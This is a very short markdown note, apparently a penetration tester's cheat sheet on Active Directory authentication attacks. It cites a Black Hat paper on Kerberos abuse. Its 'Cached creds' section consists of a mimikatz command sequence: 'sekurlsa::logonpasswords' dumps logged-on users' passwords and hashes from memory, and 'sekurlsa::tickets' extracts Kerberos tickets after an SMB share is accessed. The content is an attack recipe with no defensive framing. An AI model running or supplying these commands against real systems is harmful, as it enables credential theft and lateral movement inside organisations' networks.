# AD authentication attacks

## Cached creds

https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf

```
PS > .\mimikatz.exe
m $ sekurlsa::logonpasswords
PS2 > dir \\some\smb\share
m $ sekurlsa::tickets
```




